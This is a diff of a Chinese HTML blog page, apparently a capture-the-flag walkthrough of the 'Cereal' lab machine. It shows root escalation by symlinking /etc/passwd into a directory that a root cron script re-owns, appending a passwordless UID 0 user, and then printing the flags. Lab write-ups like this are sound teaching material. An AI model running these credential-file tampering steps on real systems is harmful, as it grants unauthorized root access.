-<span class="token function">chown</span> rocky:apache /home/rocky/public_html/*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./pspy</span><br></pre></td></tr></table></figure>
+<p>注意到有这么一行： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CMD: UID=0    PID=24316  | /bin/bash /usr/share/scripts/chown.sh</span><br></pre></td></tr></table></figure></p>
+<p>该脚本由root运行，并且看这名字像是更改属主的脚本，通过 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l /usr/share/scripts/chown.sh</span><br><span class="line">-rw-r--r--. 1 root root 45 May 29  2021 /usr/share/scripts/chown.sh</span><br></pre></td></tr></table></figure></p>
+<p>发现我们拥有读的权限。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/scripts/chown.sh</span><br><span class="line"></span><br><span class="line">chown rocky:apache /home/rocky/public_html/*</span><br></pre></td></tr></table></figure></p>
 <p>该脚本的作用就是将/home/rocky/public_html/目录下面的所有文件的属主改为rocky，所有组改为apache。</p>
-<p>并且该脚本并不是指运行一次：（我一直开着pspy监视进程） <pre class="line-numbers language-none"><code class="language-none">2022&#x2F;05&#x2F;05 04:20:01 CMD: UID&#x3D;0    PID&#x3D;24316  | &#x2F;bin&#x2F;bash &#x2F;usr&#x2F;share&#x2F;scripts&#x2F;chown.sh
-2022&#x2F;05&#x2F;05 04:30:01 CMD: UID&#x3D;0    PID&#x3D;24389  | &#x2F;bin&#x2F;bash &#x2F;usr&#x2F;share&#x2F;scripts&#x2F;chown.sh 
-2022&#x2F;05&#x2F;05 04:40:01 CMD: UID&#x3D;0    PID&#x3D;42855  | &#x2F;bin&#x2F;bash &#x2F;usr&#x2F;share&#x2F;scripts&#x2F;chown.sh <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
+<p>并且该脚本并不是指运行一次：（我一直开着pspy监视进程） <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2022/05/05 04:20:01 CMD: UID=0    PID=24316  | /bin/bash /usr/share/scripts/chown.sh</span><br><span class="line">2022/05/05 04:30:01 CMD: UID=0    PID=24389  | /bin/bash /usr/share/scripts/chown.sh </span><br><span class="line">2022/05/05 04:40:01 CMD: UID=0    PID=42855  | /bin/bash /usr/share/scripts/chown.sh </span><br></pre></td></tr></table></figure></p>
 <p>从执行时间可以看到，好像是每隔10分钟就会自动执行一次，这让我想到了cron，那如何利用这个呢？</p>
 <blockquote>
 <p>这里有一个重要的关于Linux的知识点：<strong>修改软链接的所有者/组的话，也会修改所链接的文件的所有者/组。</strong></p>
@@ -368,34 +287,9 @@
 <li>每过10分钟，chown.sh就会修改/home/rocky/public_html/目录下所有文件的所有者/组，也就把软链接的所有者/组给修改了</li>
 <li>那么我们就可以随意的修改/etc/passwd的内容，比如添加一个uid和gid为0的用户，也就是root</li>
 </ol>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>. <span class="token builtin class-name">cd</span> /home/rocky/public_html/
-<span class="token number">2</span>. <span class="token function">ln</span> -sf /etc/passwd ./passwd
-
-等到 <span class="token number">2022</span>/05/05 04:50:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">42906</span>  <span class="token operator">|</span> /bin/bash /usr/share/scripts/chown.sh
-
-<span class="token number">3</span>. <span class="token function">ls</span> -l /etc/passwd <span class="token comment"># 查看权限</span>
-<span class="token number">4</span>. <span class="token builtin class-name">echo</span> <span class="token string">"m1ku::0:0:root:/root:/bin/bash"</span> <span class="token operator">>></span> /etc/passwd  <span class="token comment"># 添加一个root用户，注意密码为空</span>
-<span class="token number">5</span>. <span class="token function">su</span> m1ku<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="built_in">cd</span> /home/rocky/public_html/</span><br><span class="line">2. ln -sf /etc/passwd ./passwd</span><br><span class="line"></span><br><span class="line">等到 2022/05/05 04:50:01 CMD: UID=0    PID=42906  | /bin/bash /usr/share/scripts/chown.sh</span><br><span class="line"></span><br><span class="line">3. ls -l /etc/passwd <span class="comment"># 查看权限</span></span><br><span class="line">4. <span class="built_in">echo</span> <span class="string">&quot;m1ku::0:0:root:/root:/bin/bash&quot;</span> &gt;&gt; /etc/passwd  <span class="comment"># 添加一个root用户，注意密码为空</span></span><br><span class="line">5. su m1ku</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505115315.png" /></p>
-<p>读取flag： <pre class="line-numbers language-none"><code class="language-none">1. &#x2F;hoem&#x2F;rocky&#x2F;local.txt
-aaa87365bf3dc0c1a82aa14b4ce26bbc
-
-2. &#x2F;root&#x2F;flag.txt
-Well done! You have completed Cereal.
-
-  ____                    _ 
- &#x2F; ___|___ _ __ ___  __ _| |
-| |   &#x2F; _ \ &#39;__&#x2F; _ \&#x2F; _&#96; | |
-| |__|  __&#x2F; | |  __&#x2F; (_| | |
- \____\___|_|  \___|\__,_|_|
-                            
-
-This box was brought to you by Bootlesshacker.
-
-Follow me on Twitter: @bootlesshacker
-My website: https:&#x2F;&#x2F;www.bootlesshacker.com
-
-Root Flag: 1aeb5db4e979543cb807cfd90df77763<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>读取flag： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1. /hoem/rocky/local.txt</span><br><span class="line">aaa87365bf3dc0c1a82aa14b4ce26bbc</span><br><span class="line"></span><br><span class="line">2. /root/flag.txt</span><br><span class="line">Well done! You have completed Cereal.</span><br><span class="line"></span><br><span class="line">  ____                    _ </span><br><span class="line"> / ___|___ _ __ ___  __ _| |</span><br><span class="line">| |   / _ \ &#x27;__/ _ \/ _` | |</span><br><span class="line">| |__|  __/ | |  __/ (_| | |</span><br><span class="line"> \____\___|_|  \___|\__,_|_|</span><br><span class="line">                            </span><br><span class="line"></span><br><span class="line">This box was brought to you by Bootlesshacker.</span><br><span class="line"></span><br><span class="line">Follow me on Twitter: @bootlesshacker</span><br><span class="line">My website: https://www.bootlesshacker.com</span><br><span class="line"></span><br><span class="line">Root Flag: 1aeb5db4e979543cb807cfd90df77763</span><br></pre></td></tr></table></figure></p>
 <h1 id="总结">3. 总结</h1>
 <p>该靶机的难度在于两点：</p>
 <ol type="1">
@@ -459,7 +353,6 @@ Root Flag: 1aeb5db4e979543cb807cfd90df77763<span aria-hidden="true" class="line-
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
     </div>
 
